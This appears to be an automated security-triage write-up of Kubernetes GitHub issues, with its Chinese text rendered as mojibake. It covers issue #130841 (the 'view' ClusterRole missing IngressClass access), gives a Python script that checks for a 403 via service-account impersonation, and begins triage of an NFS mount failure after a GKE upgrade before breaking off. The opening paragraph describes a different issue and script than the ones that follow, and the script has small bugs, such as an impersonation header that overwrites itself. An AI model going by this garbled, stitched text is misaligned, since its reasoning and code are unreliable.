è¯¥ Python è„šæœ¬å¹¶æœªå°è¯•å¤ç° Issue ä¸­æè¿°çš„é—®é¢˜ã€‚å› ä¸ºç»è¿‡åˆ†æï¼Œè¯¥ Issue è¢«å®šæ€§ä¸º Kubernetes é›†ç¾¤å‡çº§åå‡ºç°çš„åŠŸèƒ½æ€§æ•…éšœæˆ–å…¼å®¹æ€§é—®é¢˜ï¼Œä¸»è¦å½±å“æ˜¯ Pod çš„å¯ç”¨æ€§ï¼Œè€Œéä¸€ä¸ªå¯è¢«åˆ©ç”¨çš„å®‰å…¨æ¼æ´ã€‚æ ¹æ®ç”¨æˆ·æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œæ­¤é—®é¢˜é£é™©è¯„çº§ä¸ºâ€œä¸æ¶‰åŠâ€ã€‚

è¦æ±‚ä¸­æ˜ç¡®æŒ‡å‡ºï¼Œâ€œé’ˆå¯¹é«˜é£é™©é—®é¢˜ï¼Œå¿…é¡»ç»™å‡ºä½¿ç”¨ python ç¼–å†™çš„å¤ç°è„šæœ¬â€ã€‚ç”±äºæ­¤é—®é¢˜ä¸å±äºé«˜é£é™©ï¼Œå› æ­¤ä¸éœ€è¦æä¾›å¤ç°è„šæœ¬ã€‚è„šæœ¬å†…å®¹ä»…åŒ…å«ä¸€æ¡æ‰“å°è¯­å¥ï¼Œè¯´æ˜äº†ä¸æä¾›å¤ç°è„šæœ¬çš„åŸå› ï¼Œå¹¶åŒ…å«ä¸€ä¸ªç®€å•çš„ `main` å‡½æ•°ä»¥ç¬¦åˆæ‰§è¡Œç»“æ„çš„è¦æ±‚ï¼ˆå°½ç®¡åœ¨æ­¤åœºæ™¯ä¸‹æ„ä¹‰ä¸å¤§ï¼‰ã€‚

---


## Issue #130841 â€œviewâ€ ClusterRole is missing IngressClass.

- Issue é“¾æ¥ï¼š[#130841](https://github.com/kubernetes/kubernetes/issues/130841)

### Issue å†…å®¹

#### summary

â€œviewâ€ ClusterRole is missing IngressClass.

https://github.com/kubernetes/kubernetes/blob/157f42bff333811956531ea692cc1fdfa0d6a0a4/plugin/pkg/auth/authorizer/rbac/bootstrappolicy/policy.go#L140

but, `IngressClass` is a kind of `networkingk8s.io`

https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.32/#ingressclass-v1-networking-k8s-io

#### what to do?

Make additions similar to EndpointSlice.

https://github.com/kubernetes/kubernetes/commit/896bb932effab720f15cd5f55bee54567fd3f208#diff-20a4cb385b45847644dd1d7f54ffd9427168b75ba2040ad1821c70955ca7f017

#### situation

when I create this ClusterRoleBinding

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: kubernetes-dashboard-web
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: view
subjects:
- kind: ServiceAccount
  name: kubernetes-dashboard-web
  namespace: kube-system
```

then, it errors.
This prevents the use of minimum privileges in the k8s-dashboard.

<img width="298" alt="Image" src="https://github.com/user-attachments/assets/20dd713d-384f-4d18-a702-306a024ff699" />

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æŒ‡å‡º Kubernetes å†…å»ºçš„ `view` ClusterRole ç¼ºå°‘å¯¹ `networking.k8s.io/v1` API ç»„ä¸‹ `IngressClass` èµ„æºçš„è¯»å–æƒé™ï¼ˆ`get`, `list`, `watch`ï¼‰ã€‚

1.  **é—®é¢˜æ€§è´¨**ï¼š`view` ClusterRole çš„è®¾è®¡ç›®çš„æ˜¯æä¾›å¯¹é›†ç¾¤å†…å¤§å¤šæ•°èµ„æºçš„åªè¯»è®¿é—®æƒé™ã€‚éšç€ Kubernetes çš„å‘å±•ï¼Œæ–°çš„èµ„æºç±»å‹ï¼ˆå¦‚ `IngressClass`ï¼‰è¢«å¼•å…¥ã€‚å¦‚æœå†…å»ºè§’è‰²æ²¡æœ‰åŠæ—¶æ›´æ–°ä»¥åŒ…å«è¿™äº›æ–°èµ„æºçš„åªè¯»æƒé™ï¼Œé‚£ä¹ˆè¢«èµ‹äºˆè¯¥è§’è‰²çš„ç”¨æˆ·æˆ–æœåŠ¡è´¦å·åœ¨å°è¯•è®¿é—®è¿™äº›æ–°èµ„æºæ—¶å°±ä¼šé‡åˆ°æƒé™é”™è¯¯ã€‚
2.  **å…·ä½“åœºæ™¯**ï¼šIssue æäº¤è€…æä¾›äº†ä¸€ä¸ªä¾‹å­ï¼Œå°†ä¸€ä¸ª ServiceAccount (`kubernetes-dashboard-web`) é€šè¿‡ ClusterRoleBinding ç»‘å®šåˆ°äº† `view` ClusterRoleã€‚å½“è¿™ä¸ª ServiceAccountï¼ˆå¯èƒ½æ˜¯ Kubernetes Dashboard ä½¿ç”¨çš„ï¼‰å°è¯•åˆ—å‡ºæˆ–è·å– `IngressClass` èµ„æºæ—¶ï¼Œç”±äº `view` è§’è‰²ç¼ºå°‘ç›¸åº”æƒé™ï¼Œæ“ä½œå¤±è´¥å¹¶æŠ¥é”™ï¼ˆæˆªå›¾æ˜¾ç¤ºäº†ç›¸å…³é”™è¯¯ï¼‰ã€‚æäº¤è€…è®¤ä¸ºè¿™é˜»ç¢äº†ä¸º Kubernetes Dashboard é…ç½®æœ€å°æƒé™åŸåˆ™ã€‚
3.  **å®‰å…¨é£é™©è¯„ä¼°**ï¼š
    *   è¯¥é—®é¢˜æœ¬è´¨ä¸Šæ˜¯**æƒé™ç¼ºå¤±**ï¼Œè€Œä¸æ˜¯æƒé™è¿‡å¤§æˆ–æƒé™ç»•è¿‡ã€‚`view` è§’è‰²æœªèƒ½æŒ‰é¢„æœŸæä¾›å¯¹æŸç±»èµ„æºçš„åªè¯»è®¿é—®ã€‚
    *   è¿™ä¸ä¼šå¯¼è‡´æœªç»æˆæƒçš„å†™æ“ä½œã€æƒé™æå‡ã€å‘½ä»¤æ‰§è¡Œã€ä¿¡æ¯æ³„éœ²ï¼ˆé™¤äº†æ— æ³•è¯»å– `IngressClass` ä¿¡æ¯æœ¬èº«ï¼‰æˆ–æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
    *   æ”»å‡»è€…æ— æ³•åˆ©ç”¨è¿™ä¸ªâ€œç¼ºå¤±â€çš„æƒé™æ¥æ”»å‡»ç³»ç»Ÿæˆ–è·å–éæ³•è®¿é—®æƒé™ã€‚
    *   è™½ç„¶è¿™ä¼šå¯¼è‡´ä¾èµ– `view` è§’è‰²çš„åº”ç”¨ï¼ˆå¦‚ Dashboardï¼‰åŠŸèƒ½å—é™ï¼Œè¿«ä½¿ç”¨æˆ·å¯èƒ½éœ€è¦æˆäºˆæ›´å¹¿æ³›çš„æƒé™ï¼ˆä¾‹å¦‚ `cluster-admin` æˆ–è‡ªå®šä¹‰ä¸€ä¸ªåŒ…å« `IngressClass` è¯»å–æƒé™çš„è§’è‰²ï¼‰æ¥è§£å†³åŠŸèƒ½é—®é¢˜ï¼Œä½†è¿™å±äºé…ç½®å’ŒåŠŸèƒ½å®Œæ•´æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚ç”¨æˆ·éœ€è¦è‡ªè¡Œç®¡ç†å’Œè°ƒæ•´RBACç­–ç•¥ä»¥æ»¡è¶³åº”ç”¨éœ€æ±‚ã€‚
    *   æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
        *   æ ‡å‡†2ï¼šè¯¥é—®é¢˜éå®‰å…¨é—®é¢˜ï¼Œå› ä¸ºå®ƒæè¿°çš„æ˜¯åŠŸèƒ½ç¼ºå¤±ï¼ˆæƒé™ä¸è¶³ï¼‰ï¼Œè€Œéå¯åˆ©ç”¨çš„æ¼æ´ã€‚
        *   æ ‡å‡†4ï¼šIssue æäº¤è€…æš´éœ²çš„é…ç½®ä¿¡æ¯ (`ClusterRoleBinding`) æ˜¯æ ‡å‡†çš„ Kubernetes å¯¹è±¡å®šä¹‰ï¼Œä¸åŒ…å«æ•æ„Ÿä¿¡æ¯ã€‚å³ä½¿åŒ…å«ï¼Œä¹Ÿå±äºæäº¤è€…çš„é—®é¢˜ï¼Œä¸è®¡å…¥é¡¹ç›®é£é™©ã€‚
        *   æ ‡å‡†5ã€6ã€7ã€8ï¼šå‡ä¸é€‚ç”¨ï¼Œå› ä¸ºé—®é¢˜ä¸æ¶‰åŠ DoSã€å‡­æ®æ³„éœ²ã€å‘½ä»¤æ‰§è¡Œæˆ–å¤šç”¨æˆ·å½±å“ã€‚

ç»“è®ºï¼šè¯¥ Issue æè¿°çš„æ˜¯ä¸€ä¸ª Kubernetes å†…å»º RBAC è§’è‰²å®šä¹‰ä¸å®Œæ•´å¯¼è‡´çš„åŠŸèƒ½æ€§é—®é¢˜ï¼Œè€Œéå®‰å…¨æ¼æ´ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import logging
import time
import sys
from kubernetes import config, client
from kubernetes.client.rest import ApiException
import contextlib
import os

# é…ç½®æ—¥å¿—è®°å½•
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# å®šä¹‰èµ„æºåç§°
NAMESPACE = "issue-demonstration-ns"
SERVICE_ACCOUNT_NAME = "view-test-sa"
# æ³¨æ„ï¼šClusterRoleBinding æ˜¯é›†ç¾¤çº§åˆ«çš„ï¼Œæ²¡æœ‰ namespace
CLUSTER_ROLE_BINDING_NAME = "view-test-sa-binding"
# ä½¿ç”¨ view ClusterRoleï¼Œè¿™æ˜¯å†…å»ºçš„
CLUSTER_ROLE_NAME = "view"

def demonstrate_missing_permission():
    """
    å°è¯•å¤ç° 'view' ClusterRole ç¼ºå°‘ IngressClass è¯»å–æƒé™çš„é—®é¢˜ã€‚
    """
    try:
        # 1. åŠ è½½ KubeConfigï¼Œå‡è®¾åœ¨é»˜è®¤ä½ç½® ~/.kube/config
        logging.info("åŠ è½½ Kubernetes é…ç½®...")
        try:
            config.load_kube_config()
        except Exception as e:
            logging.error(f"æ— æ³•åŠ è½½ kubeconfig: {e}")
            logging.error("è¯·ç¡®ä¿ kubeconfig æ–‡ä»¶å­˜åœ¨äºé»˜è®¤ä½ç½®æˆ–å·²é…ç½® KUBECONFIG ç¯å¢ƒå˜é‡ã€‚")
            sys.exit(1)

        # 2. åˆ›å»º API å®¢æˆ·ç«¯
        core_v1_api = client.CoreV1Api()
        rbac_v1_api = client.RbacAuthorizationV1Api()
        networking_v1_api = client.NetworkingV1Api()
        api_client = client.ApiClient() # ç”¨äºæ¨¡æ‹Ÿ ServiceAccount

        logging.info(f"æµ‹è¯•ç¯å¢ƒå‡†å¤‡...")

        # 3. åˆ›å»º Namespace
        namespace_body = client.V1Namespace(metadata=client.V1ObjectMeta(name=NAMESPACE))
        try:
            logging.info(f"åˆ›å»º Namespace: {NAMESPACE}")
            core_v1_api.create_namespace(body=namespace_body)
            time.sleep(2) # ç­‰å¾… namespace åˆ›å»ºå®Œæˆ
        except ApiException as e:
            if e.status == 409: # Conflict, already exists
                logging.warning(f"Namespace {NAMESPACE} å·²å­˜åœ¨ï¼Œç»§ç»­...")
            else:
                logging.error(f"åˆ›å»º Namespace {NAMESPACE} å¤±è´¥: {e}")
                raise

        # 4. åˆ›å»º Service Account
        sa_body = client.V1ServiceAccount(
            metadata=client.V1ObjectMeta(name=SERVICE_ACCOUNT_NAME, namespace=NAMESPACE)
        )
        try:
            logging.info(f"åœ¨ Namespace {NAMESPACE} ä¸­åˆ›å»º ServiceAccount: {SERVICE_ACCOUNT_NAME}")
            core_v1_api.create_namespaced_service_account(namespace=NAMESPACE, body=sa_body)
            time.sleep(2) # ç­‰å¾… SA åˆ›å»º
        except ApiException as e:
            if e.status == 409:
                logging.warning(f"ServiceAccount {SERVICE_ACCOUNT_NAME} åœ¨ {NAMESPACE} ä¸­å·²å­˜åœ¨ï¼Œç»§ç»­...")
            else:
                logging.error(f"åˆ›å»º ServiceAccount {SERVICE_ACCOUNT_NAME} å¤±è´¥: {e}")
                raise

        # 5. åˆ›å»º ClusterRoleBinding å°† Service Account ç»‘å®šåˆ° 'view' ClusterRole
        # æ³¨æ„ ClusterRoleBinding æ˜¯é›†ç¾¤çº§åˆ«çš„
        crb_body = client.V1ClusterRoleBinding(
            metadata=client.V1ObjectMeta(name=CLUSTER_ROLE_BINDING_NAME),
            role_ref=client.V1RoleRef(
                api_group="rbac.authorization.k8s.io",
                kind="ClusterRole",
                name=CLUSTER_ROLE_NAME
            ),
            subjects=[client.V1Subject(
                kind="ServiceAccount",
                name=SERVICE_ACCOUNT_NAME,
                namespace=NAMESPACE
            )]
        )
        try:
            logging.info(f"åˆ›å»º ClusterRoleBinding: {CLUSTER_ROLE_BINDING_NAME} å°† SA {NAMESPACE}/{SERVICE_ACCOUNT_NAME} ç»‘å®šåˆ° ClusterRole '{CLUSTER_ROLE_NAME}'")
            rbac_v1_api.create_cluster_role_binding(body=crb_body)
            time.sleep(2) # ç­‰å¾… RBAC è§„åˆ™ç”Ÿæ•ˆ
        except ApiException as e:
            if e.status == 409:
                logging.warning(f"ClusterRoleBinding {CLUSTER_ROLE_BINDING_NAME} å·²å­˜åœ¨ï¼Œç»§ç»­...")
                # å¦‚æœå·²å­˜åœ¨ï¼Œå¯èƒ½éœ€è¦æ›´æ–°æˆ–ç¡®è®¤å…¶é…ç½®æ­£ç¡®
                # ä¸ºäº†æ¼”ç¤ºï¼Œæˆ‘ä»¬å‡è®¾å¦‚æœå·²å­˜åœ¨ï¼Œå®ƒå°±æ˜¯æˆ‘ä»¬æƒ³è¦çš„é…ç½®
                pass
            else:
                logging.error(f"åˆ›å»º ClusterRoleBinding {CLUSTER_ROLE_BINDING_NAME} å¤±è´¥: {e}")
                raise

        logging.info("ç¯å¢ƒå‡†å¤‡å®Œæ¯•ã€‚å¼€å§‹æµ‹è¯•æƒé™...")

        # 6. å°è¯•ä½¿ç”¨ Service Account çš„èº«ä»½åˆ—å‡º IngressClass (é›†ç¾¤èŒƒå›´èµ„æº)
        # Kubernetes Python å®¢æˆ·ç«¯ä½¿ç”¨ impersonation éœ€è¦è®¾ç½® ApiClient çš„å‚æ•°
        # Service Account çš„ç”¨æˆ·åä¸º: system:serviceaccount:<namespace>:<serviceaccountname>
        sa_user = f"system:serviceaccount:{NAMESPACE}:{SERVICE_ACCOUNT_NAME}"
        logging.info(f"å°è¯•ä»¥ ServiceAccount '{sa_user}' çš„èº«ä»½åˆ—å‡º IngressClass...")

        # åˆ›å»ºä¸€ä¸ªæ–°çš„ ApiClient å®ä¾‹ç”¨äºæ¨¡æ‹Ÿ
        impersonated_api_client = client.ApiClient()
        impersonated_api_client.configuration.host = api_client.configuration.host # ç»§æ‰¿å½“å‰ host
        impersonated_api_client.configuration.ssl_ca_cert = api_client.configuration.ssl_ca_cert
        impersonated_api_client.configuration.cert_file = api_client.configuration.cert_file
        impersonated_api_client.configuration.key_file = api_client.configuration.key_file
        impersonated_api_client.configuration.api_key = api_client.configuration.api_key # ç»§æ‰¿è®¤è¯ä¿¡æ¯

        # è®¾ç½® impersonation header
        impersonated_api_client.set_default_header("Impersonate-User", sa_user)
        # ServiceAccount é»˜è®¤å±äº system:serviceaccounts å’Œ system:serviceaccounts:<namespace> ç»„
        impersonated_api_client.set_default_header("Impersonate-Group", f"system:serviceaccounts:{NAMESPACE}")
        impersonated_api_client.set_default_header("Impersonate-Group", "system:serviceaccounts") # åŒ…å«ä¸¤ä¸ªç»„

        impersonated_networking_v1_api = client.NetworkingV1Api(impersonated_api_client)

        try:
            impersonated_networking_v1_api.list_ingress_class(timeout_seconds=10)
            # å¦‚æœæ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜æƒé™æ£€æŸ¥é€šè¿‡äº†ï¼Œä¸é¢„æœŸä¸ç¬¦
            logging.error(f"é¢„æœŸå¤–çš„æˆåŠŸï¼šServiceAccount '{sa_user}' ä¼¼ä¹æ‹¥æœ‰åˆ—å‡º IngressClass çš„æƒé™ã€‚")
            logging.error("è¿™å¯èƒ½æ„å‘³ç€é›†ç¾¤ä¸­çš„ 'view' ClusterRole å·²è¢«ä¿®æ”¹ï¼Œæˆ–è€…å­˜åœ¨å…¶ä»–æˆæƒè§„åˆ™ã€‚")
            result = False
        except ApiException as e:
            if e.status == 403:
                # è¿™æ˜¯é¢„æœŸçš„ç»“æœï¼Œå› ä¸º 'view' è§’è‰²é»˜è®¤ä¸åŒ…å« IngressClass çš„ list æƒé™
                logging.info(f"æˆåŠŸå¤ç°ï¼šæ”¶åˆ°é¢„æœŸçš„ 403 Forbidden é”™è¯¯ã€‚")
                logging.info(f"é”™è¯¯è¯¦æƒ…: {e.reason} - {e.body}")
                result = True
            else:
                # å…¶ä»–é 403 çš„ API é”™è¯¯
                logging.error(f"å°è¯•åˆ—å‡º IngressClass æ—¶å‘ç”Ÿéé¢„æœŸçš„ API é”™è¯¯: {e}")
                result = False
        except Exception as e:
             logging.error(f"å°è¯•åˆ—å‡º IngressClass æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
             result = False

        if result:
            logging.info("ç»“è®ºï¼šæˆåŠŸéªŒè¯ 'view' ClusterRole é»˜è®¤ç¼ºå°‘åˆ—å‡º IngressClass çš„æƒé™ã€‚")
        else:
            logging.warning("ç»“è®ºï¼šæœªèƒ½æŒ‰é¢„æœŸéªŒè¯æƒé™ç¼ºå¤±ã€‚è¯·æ£€æŸ¥é›†ç¾¤é…ç½®æˆ–è„šæœ¬é€»è¾‘ã€‚")

    except Exception as e:
        logging.error(f"è„šæœ¬æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯: {e}", exc_info=True)
    finally:
        # 7. æ¸…ç†èµ„æº
        logging.info("å¼€å§‹æ¸…ç†æµ‹è¯•èµ„æº...")
        try:
            # åˆ é™¤ ClusterRoleBinding
            with contextlib.suppress(ApiException): # å¿½ç•¥ 'Not Found' ç­‰é”™è¯¯
                logging.info(f"åˆ é™¤ ClusterRoleBinding: {CLUSTER_ROLE_BINDING_NAME}")
                rbac_v1_api.delete_cluster_role_binding(name=CLUSTER_ROLE_BINDING_NAME, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                time.sleep(2) # ç­‰å¾…åˆ é™¤

            # åˆ é™¤ Service Account (éœ€è¦å…ˆåŠ è½½ä¸€æ¬¡ API å®¢æˆ·ç«¯ï¼Œä»¥é˜²ä¹‹å‰å¤±è´¥)
            with contextlib.suppress(ApiException):
                logging.info(f"åˆ é™¤ ServiceAccount: {SERVICE_ACCOUNT_NAME} in {NAMESPACE}")
                core_v1_api.delete_namespaced_service_account(name=SERVICE_ACCOUNT_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                time.sleep(2) # ç­‰å¾…åˆ é™¤

            # åˆ é™¤ Namespace
            with contextlib.suppress(ApiException):
                logging.info(f"åˆ é™¤ Namespace: {NAMESPACE}")
                core_v1_api.delete_namespace(name=NAMESPACE, body=client.V1DeleteOptions(propagation_policy='Foreground', grace_period_seconds=0))
                logging.info("ç­‰å¾… Namespace åˆ é™¤å®Œæˆ...")
                # ç­‰å¾… namespace å½»åº•åˆ é™¤ï¼Œå¯ä»¥ç®€å• sleep æˆ–è½®è¯¢æ£€æŸ¥
                time.sleep(10)

        except NameError:
             logging.warning("API å®¢æˆ·ç«¯æœªæˆåŠŸåˆå§‹åŒ–ï¼Œè·³è¿‡éƒ¨åˆ†æ¸…ç†æ­¥éª¤ã€‚")
        except Exception as e:
            logging.error(f"æ¸…ç†èµ„æºæ—¶å‘ç”Ÿé”™è¯¯: {e}", exc_info=True)
            logging.warning("è¯·æ‰‹åŠ¨æ¸…ç†èµ„æºï¼šNamespace '{NAMESPACE}', ClusterRoleBinding '{CLUSTER_ROLE_BINDING_NAME}'")

        logging.info("æ¸…ç†å®Œæˆã€‚")

# ç›´æ¥æ‰§è¡Œä¸»å‡½æ•°
demonstrate_missing_permission()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥ Python è„šæœ¬æ—¨åœ¨ä½¿ç”¨ Kubernetes Python å®¢æˆ·ç«¯åº“æ¥**éªŒè¯** Issue ä¸­æè¿°çš„é—®é¢˜ï¼Œå³éªŒè¯ç»‘å®šåˆ°å†…å»º `view` ClusterRole çš„ ServiceAccount æ˜¯å¦ç¡®å®æ²¡æœ‰æƒé™åˆ—å‡º `IngressClass` èµ„æºã€‚è¿™**ä¸æ˜¯ä¸€ä¸ªåˆ©ç”¨æ¼æ´çš„ POC**ï¼Œè€Œæ˜¯å¯¹ Issue æ‰€æŠ¥å‘Šç°è±¡çš„ç¼–ç¨‹æ–¹å¼ç¡®è®¤ã€‚

è„šæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š
1.  **åŠ è½½é…ç½®**ï¼šä»é»˜è®¤ä½ç½® (`~/.kube/config` æˆ–ç¯å¢ƒå˜é‡ `KUBECONFIG`) åŠ è½½ Kubernetes é›†ç¾¤çš„è¿æ¥é…ç½®ã€‚
2.  **åˆ›å»º K8s å®¢æˆ·ç«¯**ï¼šåˆå§‹åŒ–ä¸ Kubernetes API Serveräº¤äº’æ‰€éœ€çš„å®¢æˆ·ç«¯å¯¹è±¡ (`CoreV1Api`, `RbacAuthorizationV1Api`, `NetworkingV1Api`)ã€‚
3.  **ç¯å¢ƒå‡†å¤‡**ï¼š
    *   åˆ›å»º ä¸€ä¸ªä¸´æ—¶çš„ Namespace (`issue-demonstration-ns`) ç”¨äºéš”ç¦»æµ‹è¯•èµ„æºã€‚
    *   åœ¨ è¯¥ Namespace ä¸­åˆ›å»ºä¸€ä¸ª ServiceAccount (`view-test-sa`)ã€‚
    *   åˆ›å»º ä¸€ä¸ª ClusterRoleBinding (`view-test-sa-binding`)ï¼Œå°†è¿™ä¸ª ServiceAccount ç»‘å®šåˆ°é›†ç¾¤èŒƒå›´çš„å†…å»º `view` ClusterRoleã€‚
4.  **æƒé™æµ‹è¯•**ï¼š
    *   é…ç½®ä¸€ä¸ªæ–°çš„ `ApiClient` å®ä¾‹ï¼Œè®¾ç½® HTTP Header æ¥**æ¨¡æ‹Ÿ (Impersonate)** åˆšåˆ›å»ºçš„ ServiceAccount (`system:serviceaccount:issue-demonstration-ns:view-test-sa`) çš„èº«ä»½ã€‚
    *   ä½¿ç”¨è¿™ä¸ªæ¨¡æ‹Ÿèº«ä»½çš„ `NetworkingV1Api` å®¢æˆ·ç«¯å°è¯•æ‰§è¡Œ `list_ingress_class()` æ“ä½œã€‚
    *   **é¢„æœŸç»“æœ**ï¼šç”±äº `view` ClusterRole é»˜è®¤ä¸åŒ…å« `networking.k8s.io` API ç»„ä¸‹ `ingressclasses` èµ„æºçš„ `list` æƒé™ï¼Œæ­¤ API è°ƒç”¨åº”è¯¥å¤±è´¥ï¼Œå¹¶è¿”å› HTTP 403 Forbidden é”™è¯¯ã€‚
    *   è„šæœ¬ä¼šæ•è· `ApiException`ï¼Œæ£€æŸ¥é”™è¯¯çŠ¶æ€ç æ˜¯å¦ä¸º 403ã€‚å¦‚æœæ˜¯ 403ï¼Œåˆ™è®¤ä¸ºæˆåŠŸå¤ç°äº† Issue ä¸­æè¿°çš„æƒé™ç¼ºå¤±é—®é¢˜ï¼›å¦åˆ™è®°å½•æ„å¤–çš„æˆåŠŸæˆ–å¤±è´¥ã€‚
5.  **èµ„æºæ¸…ç†**ï¼šä½¿ç”¨ `try...finally` å—ç¡®ä¿æ— è®ºæµ‹è¯•æ˜¯å¦æˆåŠŸæˆ–å‡ºé”™ï¼Œè„šæœ¬éƒ½ä¼šå°è¯•åˆ é™¤ä¹‹å‰åˆ›å»ºçš„æ‰€æœ‰èµ„æºï¼ˆClusterRoleBindingã€ServiceAccountã€Namespaceï¼‰ï¼Œä»¥ä¿æŒé›†ç¾¤ç¯å¢ƒçš„æ¸…æ´ã€‚ä½¿ç”¨ `contextlib.suppress(ApiException)` æ¥ä¼˜é›…åœ°å¤„ç†åˆ é™¤æ—¶èµ„æºå¯èƒ½å·²è¢«åˆ é™¤çš„æƒ…å†µã€‚

è¯¥è„šæœ¬é€šè¿‡ç¼–ç¨‹æ–¹å¼æ¨¡æ‹Ÿäº† Issue ä¸­ç”¨æˆ·æ‰‹åŠ¨æ“ä½œçš„åœºæ™¯ï¼Œå¹¶éªŒè¯äº†æƒé™æ£€æŸ¥çš„ç»“æœï¼Œä»è€Œç¡®è®¤äº† `view` ClusterRole åœ¨æ ‡å‡† Kubernetes å‘è¡Œç‰ˆä¸­ç¡®å®ç¼ºå°‘å¯¹ `IngressClass` çš„è¯»å–æƒé™ã€‚

---


## Issue #130839 NFS mount failed after GKE upgrade me to 1.32 from 1.31

- Issue é“¾æ¥ï¼š[#130839](https://github.com/kubernetes/kubernetes/issues/130839)

### Issue å†…å®¹

#### What happened?

I was using https://artifacthub.io/packages/helm/kvaps/nfs-server-provisioner and relied on the 'nfs' storageClass it creates and it has worked great.

But after the upgrade to 1.32 where also (if relevant, google upgraded base image version of ubuntu: Starting with GKE version 1.32.1-gke.1002000, the default OS image for Ubuntu is updated from Ubuntu 22.04 to Ubuntu 24.04.


Error I got after upgrade

```
â”‚ Events:                                                                                                                                                                                                                                                         â”‚
â”‚   Type     Reason             Age                From                Message                                                                                                                                                                                    â”‚
â”‚   ----     ------             ----               ----                -------                                                                                                                                                                                    â”‚
â”‚   Warning  FailedScheduling   13s (x2 over 14s)  default-scheduler   0/6 nodes are available: pod has unbound immediate PersistentVolumeClaims. preemption: 0/6 nodes are available: 6 Preemption is not helpful for scheduling.                                â”‚
â”‚   Normal   NotTriggerScaleUp  13s                cluster-autoscaler  pod didn't trigger scale-up: 2 pod has unbound immediate PersistentVolumeClaims                                                                                                            â”‚
â”‚   Normal   Scheduled          10s                default-scheduler   Successfully assigned default/generate-queue-worker-default-deployment-74cf9b9c48-csgzn to gke-motoaction-cluster-01-pool-1-50bf8ed5-jxod                                                  â”‚
â”‚   Warning  FailedMount        2s (x5 over 10s)   kubelet             MountVolume.SetUp failed for volume "pvc-f5ed14c5-5005-4214-a47c-55f3e484e019" : mount failed: exit status 1                                                                               â”‚
â”‚ Mounting command: /home/kubernetes/containerized_mounter/mounter                                                                                                                                                                                                â”‚
â”‚ Mounting arguments: mount -t nfs -o nolock,vers=3 10.172.14.147:/export/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019 /var/lib/kubelet/pods/9696f022-f447-4127-ab24-677d99af0561/volumes/kubernetes.io~nfs/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019                  â”‚
â”‚ Output: Mount failed: mount failed: exit status 127                                                                                                                                                                                                             â”‚
â”‚ Mounting command: chroot                                                                                                                                                                                                                                        â”‚
â”‚ Mounting arguments: [/home/kubernetes/containerized_mounter/rootfs mount -t nfs -o nolock,vers=3 10.172.14.147:/export/pvc-f5ed14c5-5005-4214-a47c-55f3e484e019 /var/lib/kubelet/pods/9696f022-f447-4127-ab24-677d99af0561/volumes/kubernetes.io~nfs/pvc-f5ed14 â”‚
â”‚ c5-5005-4214-a47c-55f3e484e019]                                                                                                                                                                                                                                 â”‚
â”‚ Output: chroot: failed to run command â€˜mountâ€™: No such file or directory                                                                                                                                                                                        â”‚
â”‚
```


I guess it means it does not find the mount command where it exists it to live ?

I am no expert in k8s, but just checking inside the running node the mount command exists here:

/host/home/kubernetes/containerized_mounter/rootfs/bin/mount

and

/usr/bin/mount


-------

As I had to get the system up and running I abondoned that helm chart and installed a external nfs server and moved to nfs-csi plugin and now it works again. 

Maybe this is all deprecated I don't know, but in case it's a real problem someone might want to look into it.




#### What did you expect to happen?

The nfs mounts to work as before in 1.31 and earlier.

#### How can we reproduce it (as minimally and precisely as possible)?

Install https://artifacthub.io/packages/helm/kvaps/nfs-server-provisioner and try to create a PVC and add mount it to pod.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2-gke.1182000
```

</details>


#### Cloud provider

<details>
GKE (Google)
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä¸æ¶‰åŠ

**åˆ¤æ–­ä¾æ®ï¼š**  
Issueæè¿°äº†ä¸€ä¸ªåœ¨GKEç¯å¢ƒä»1.31ç‰ˆæœ¬å‡çº§åˆ°1.32ç‰ˆæœ¬ï¼ˆåŒæ—¶åº•å±‚æ“ä½œç³»ç»Ÿä»Ubuntu 22.04å‡çº§åˆ°24.04ï¼‰åï¼Œä½¿ç”¨`kvaps/nfs-server-provisioner`åˆ›å»ºçš„NFSç±»å‹PersistentVolumeClaimï¼ˆPVCï¼‰æ— æ³•è¢«PodæŒ‚è½½çš„é—®é¢˜ã€‚

